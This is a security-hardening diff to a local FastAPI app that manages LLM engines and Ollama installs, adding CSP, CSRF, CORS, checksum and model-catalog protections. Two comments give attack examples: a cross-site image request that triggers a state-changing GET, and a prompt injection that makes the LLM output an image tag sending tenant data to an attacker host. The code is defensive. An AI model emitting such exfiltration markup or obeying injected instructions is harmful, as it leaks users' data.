@@ -201,19 +201,19 @@ def _setup_and_activate_venv():
                 subprocess.check_call(cmd + pip_args)
                 venv_install_ok = True
             except subprocess.CalledProcessError:
-                # Retry with alternative mirror (bypasses corporate proxy/Blue Coat blocks on files.pythonhosted.org)
-                print("⚠️  Direct PyPI download failed (corporate proxy / Blue Coat block detected). Retrying via mirror index...")
-                for mirror_url, mirror_host in [
-                    ("https://mirrors.aliyun.com/pypi/simple/", "mirrors.aliyun.com"),
-                    ("https://pypi.tuna.tsinghua.edu.cn/simple", "pypi.tuna.tsinghua.edu.cn")
-                ]:
+                # Security: never silently fall back to a third-party package index (an unpinned,
+                # unhashed install from a mirror is a supply-chain risk). Behind a proxy that blocks
+                # PyPI, opt in to a mirror you trust: CLEO_PIP_MIRROR=https://your.mirror/simple
+                mirror = os.environ.get("CLEO_PIP_MIRROR", "").strip()
+                if mirror.startswith("https://"):
                     try:
-                        print(f"🔄 Retrying installation via {mirror_host} ...")
-                        subprocess.check_call(cmd + ["--index-url", mirror_url, "--trusted-host", mirror_host] + pip_args)
+                        print(f"⚠️  Direct PyPI download failed. Retrying via CLEO_PIP_MIRROR ({mirror}) ...")
+                        subprocess.check_call(cmd + ["--index-url", mirror] + pip_args)
                         venv_install_ok = True
-                        break
                     except subprocess.CalledProcessError:
-                        continue
+                        pass
+                else:
+                    print("⚠️  Direct PyPI download failed. If a proxy blocks PyPI, set CLEO_PIP_MIRROR=https://<mirror>/simple and retry.")
 
             if venv_install_ok:
                 import platform
@@ -279,17 +279,17 @@ def _setup_and_activate_venv():
         base_cmd = pip_cmd + ["install", "--disable-pip-version-check"]
 
         installed_ok = False
-        # Try flags: with --break-system-packages for PEP 668 / Homebrew 3.12+, --user for permissions, and fallback mirror if direct PyPI is blocked by corporate proxy
+        # Try flags: with --break-system-packages for PEP 668 / Homebrew 3.12+, --user for permissions (and CLEO_PIP_MIRROR if the user opted in)
         for extra_flags in [
             ["--break-system-packages"],
             ["--user", "--break-system-packages"],
             [],
             ["--user"],
-            ["--break-system-packages", "--index-url", "https://mirrors.aliyun.com/pypi/simple/", "--trusted-host", "mirrors.aliyun.com"],
-            ["--user", "--break-system-packages", "--index-url", "https://mirrors.aliyun.com/pypi/simple/", "--trusted-host", "mirrors.aliyun.com"],
-            ["--index-url", "https://mirrors.aliyun.com/pypi/simple/", "--trusted-host", "mirrors.aliyun.com"],
-            ["--user", "--index-url", "https://mirrors.aliyun.com/pypi/simple/", "--trusted-host", "mirrors.aliyun.com"],
-        ]:
+        ] + (
+            # Opt-in only (see CLEO_PIP_MIRROR note above); https index, no --trusted-host
+            [[*flags, "--index-url", _m] for _m in [os.environ.get("CLEO_PIP_MIRROR", "").strip()]
+             if _m.startswith("https://") for flags in (["--break-system-packages"], ["--user", "--break-system-packages"], [], ["--user"])]
+        ):
             try:
                 subprocess.check_call(base_cmd + extra_flags + pip_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 installed_ok = True
@@ -341,6 +341,7 @@ from contextlib import asynccontextmanager
 
 from fastapi import FastAPI, HTTPException, Request, Response
 from starlette.middleware.trustedhost import TrustedHostMiddleware
+from fastapi.middleware.cors import CORSMiddleware
 from html import escape as html_escape
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, StreamingResponse
 from pydantic import BaseModel, Field
@@ -474,10 +475,19 @@ app = FastAPI(
     lifespan=lifespan,
 )
 
-# Security: no CORS — the UI is served same-origin, and a wildcard policy let any web page
-# read every API response. TrustedHostMiddleware rejects requests whose Host header isn't
+# Security: the UI is served same-origin and a wildcard CORS policy let any web page read every
+# API response, so CORS is limited to the desktop shell (below). TrustedHostMiddleware rejects requests whose Host header isn't
 # loopback, which also blocks DNS-rebinding (attacker domain resolving to 127.0.0.1).
 # Extra hostnames (e.g. a reverse proxy) can be added via CLEO_ALLOWED_HOSTS=a.example,b.example
+# The Tauri desktop shell's splash page (origin tauri://localhost, or http(s)://tauri.localhost on
+# Windows) polls /health cross-origin before redirecting to the UI, so only those exact origins
+# get CORS. Web pages can't spoof them, and credentials are never allowed.
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["tauri://localhost", "http://tauri.localhost", "https://tauri.localhost"],
+    allow_methods=["GET"],
+    allow_headers=["*"],
+)
 app.add_middleware(
     TrustedHostMiddleware,
     allowed_hosts=["127.0.0.1", "localhost", "[::1]"]
@@ -646,6 +656,7 @@ def _load_sessions() -> dict:
                             os.makedirs(os.path.dirname(sessions_file), exist_ok=True)
                             with open(sessions_file, "w") as f_out:
                                 json.dump(res, f_out, indent=2)
+                            os.chmod(sessions_file, 0o600)
                         except Exception as e:
                             logger.debug(f"Could not auto-save updated GUID sessions: {e}")
                     return res
@@ -667,6 +678,7 @@ def _save_sessions():
             _sessions = dict(sorted_items[:MAX_SAVED_SESSIONS])
         with open(sessions_file, "w") as f:
             json.dump(_sessions, f, indent=2)
+        os.chmod(sessions_file, 0o600)
     except Exception as e:
         logger.warning(f"Could not save sessions cache: {e}")
 
@@ -958,6 +970,35 @@ def _start_ollama_daemon(timeout: float = 25.0) -> bool:
     logger.warning(f"⚠️ Timed out after {timeout}s waiting for Ollama daemon to respond.")
     return False
 
+_OLLAMA_SHA256_URL = "https://github.com/ollama/ollama/releases/latest/download/sha256sum.txt"
+
+def _verify_ollama_download(path: str, asset_name: str) -> tuple[bool, str]:
+    """Check a downloaded Ollama artifact against the release's published SHA-256 list.
+    Fails closed: if the checksum list is unreachable or lacks the asset, the install is refused.
+    (Guards against corruption and in-path tampering; it can't help if the release itself is compromised.)"""
+    import hashlib
+    try:
+        req = urllib.request.Request(_OLLAMA_SHA256_URL, headers={"User-Agent": "Cleo-FinOps/2.1"})
+        with urllib.request.urlopen(req, timeout=30) as resp:
+            listing = resp.read().decode("utf-8", "replace")
+    except Exception as e:
+        return False, f"Could not fetch Ollama checksums to verify the download: {e}"
+    expected = None
+    for line in listing.splitlines():
+        parts = line.split()
+        if len(parts) == 2 and os.path.basename(parts[1]) == asset_name:
+            expected = parts[0].lower()
+            break
+    if not expected:
+        return False, f"No published checksum for {asset_name}; refusing to install."
+    h = hashlib.sha256()
+    with open(path, "rb") as f:
+        for chunk in iter(lambda: f.read(1 << 20), b""):
+            h.update(chunk)
+    if h.hexdigest() != expected:
+        return False, f"Checksum mismatch for {asset_name} (expected {expected[:12]}…, got {h.hexdigest()[:12]}…). Retry, or install Ollama manually from https://ollama.com/download"
+    return True, ""
+
 def _install_ollama(status_cb=None) -> tuple[bool, str]:
     """Downloads and installs Ollama without requiring sudo."""
     system = platform.system()
@@ -991,6 +1032,12 @@ def _install_ollama(status_cb=None) -> tuple[bool, str]:
                             status_cb(round(5 + (pct * 0.7), 1), f"Downloading Ollama ({mb_cur}/{mb_tot} MB)...")
         except Exception as e:
             return False, f"Failed to download Ollama package: {e}"
+
+        ok, err = _verify_ollama_download(zip_path, "Ollama-darwin.zip")
+        if not ok:
+            try: os.remove(zip_path)
+            except OSError: pass
+            return False, err
 
         if status_cb:
             status_cb(80, "Extracting Ollama...")
@@ -1072,6 +1119,12 @@ def _install_ollama(status_cb=None) -> tuple[bool, str]:
                 except Exception:
                     pass
             return False, f"Failed to download Ollama package: {e}"
+
+        ok, err = _verify_ollama_download(tar_zst_path, f"ollama-linux-{arch}.tar.zst")
+        if not ok:
+            try: os.remove(tar_zst_path)
+            except OSError: pass
+            return False, err
 
         # 2. Extract into ~/.local (non-sudo user space)
         if status_cb:
@@ -1164,6 +1217,11 @@ def _install_ollama(status_cb=None) -> tuple[bool, str]:
         url = "https://ollama.com/download/OllamaSetup.exe"
         try:
             urllib.request.urlretrieve(url, installer_path)
+            ok, err = _verify_ollama_download(installer_path, "OllamaSetup.exe")
+            if not ok:
+                try: os.remove(installer_path)
+                except OSError: pass
+                return False, err
             if status_cb:
                 status_cb(50, "Running Ollama installer...")
             res = subprocess.run([installer_path, "/silent"], capture_output=True, timeout=180)
@@ -1309,8 +1367,17 @@ def _load_pending_verifiers() -> dict:
 # overwrite API keys via /api/tokens) using the browser's ambient access.
 _MUTATING_METHODS = {"POST", "PUT", "DELETE", "PATCH"}
 
+# Legacy n8n-compat endpoints change server state on GET (kept for existing workflows). Browsers
+# tag fetches/subresources with Sec-Fetch-Site, so a cross-site <img src=".../start?model=openai">
+# is rejected, while server-to-server callers (n8n, curl) send no such header and still work.
+_STATE_CHANGING_GET_PATHS = {"/start", "/stop", "/stop_all"}
+
 @app.middleware("http")
 async def csrf_protection(request: Request, call_next):
+    if request.method == "GET" and request.url.path in _STATE_CHANGING_GET_PATHS:
+        if request.headers.get("sec-fetch-site", "same-origin") not in ("same-origin", "none"):
+            logger.warning(f"[CSRF] Rejected cross-site GET {request.url.path}")
+            return JSONResponse(status_code=403, content={"detail": "Cross-site requests are not allowed."})
     if request.method in _MUTATING_METHODS:
         origin = request.headers.get("origin")
         if origin:
@@ -1323,6 +1390,29 @@ async def csrf_protection(request: Request, call_next):
                 )
                 return JSONResponse(status_code=403, content={"detail": "Cross-origin requests are not allowed."})
     return await call_next(request)
+
+# ── Content-Security-Policy for HTML pages ────────────────────────────────────
+# The UI renders LLM output over data that tenants control (resource names, tags), so a prompt
+# injection could emit <img src="https://attacker/?q=<data>"> to exfiltrate it. img-src/connect-src
+# lock egress to this origin. Inline scripts/styles stay allowed because the UI is a single file
+# with inline handlers; CDN scripts and Google Fonts are the only external resources it loads.
+_CSP = (
+    "default-src 'self'; "
+    "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
+    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
+    "font-src 'self' data: https://fonts.gstatic.com; "
+    "img-src 'self' data: blob:; "
+    "connect-src 'self'; "
+    "object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'"
+)
+
+@app.middleware("http")
+async def security_headers(request: Request, call_next):
+    response = await call_next(request)
+    if response.headers.get("content-type", "").startswith("text/html"):
+        response.headers.setdefault("Content-Security-Policy", _CSP)
+        response.headers.setdefault("X-Content-Type-Options", "nosniff")
+    return response
 
 # ── HTTP Request Logging Middleware ───────────────────────────────────────────
 @app.middleware("http")
@@ -2226,17 +2316,32 @@ def set_engine(req: EngineSelection):
 class DownloadRequest(BaseModel):
     model: str
 
+def _downloadable_models() -> tuple[set[str], set[str]]:
+    """(mlx repo ids, ollama model names) the UI offers. Extend via CLEO_EXTRA_MODELS=a,b,c
+    (entries starting with 'mlx:' or containing 'mlx-community/' are treated as MLX repos)."""
+    mlx = {m["repo_id"] for m in MLX_MODELS}
+    ollama = {m["id"] for m in LOCAL_MODELS}
+    for extra in (e.strip() for e in os.environ.get("CLEO_EXTRA_MODELS", "").split(",") if e.strip()):
+        (mlx if extra.startswith("mlx:") or "mlx-community/" in extra else ollama).add(extra.removeprefix("mlx:"))
+    return mlx, ollama
+
 @app.post("/api/models/download")
 def download_model(req: DownloadRequest):
-    model = req.model
-    if model.startswith("mlx:") or "mlx-community" in model or "mlx" in model:
-        repo_id = model.removeprefix("mlx:").strip()
+    model = req.model.strip()
+    # Security: only catalogued models. Previously any string containing "mlx" became an arbitrary
+    # Hugging Face repo and anything else an arbitrary `ollama pull` target (incl. third-party registries).
+    allowed_mlx, allowed_ollama = _downloadable_models()
+    if model.removeprefix("mlx:") in allowed_mlx:
+        repo_id = model.removeprefix("mlx:")
         existing = _model_downloads.get(repo_id, {})
         if existing.get("status") == "downloading":
             return {"status": "already_downloading", "progress": existing.get("progress", 0)}
         t = threading.Thread(target=_bg_pull_mlx_model, args=(repo_id,), daemon=True)
         t.start()
         return {"status": "started", "model": repo_id, "type": "mlx"}
+
+    if model not in allowed_ollama:
+        raise HTTPException(status_code=400, detail=f"Model '{model}' is not in Cleo's model catalog.")
 
     existing = _model_downloads.get(model, {})
     if existing.get("status") == "downloading":
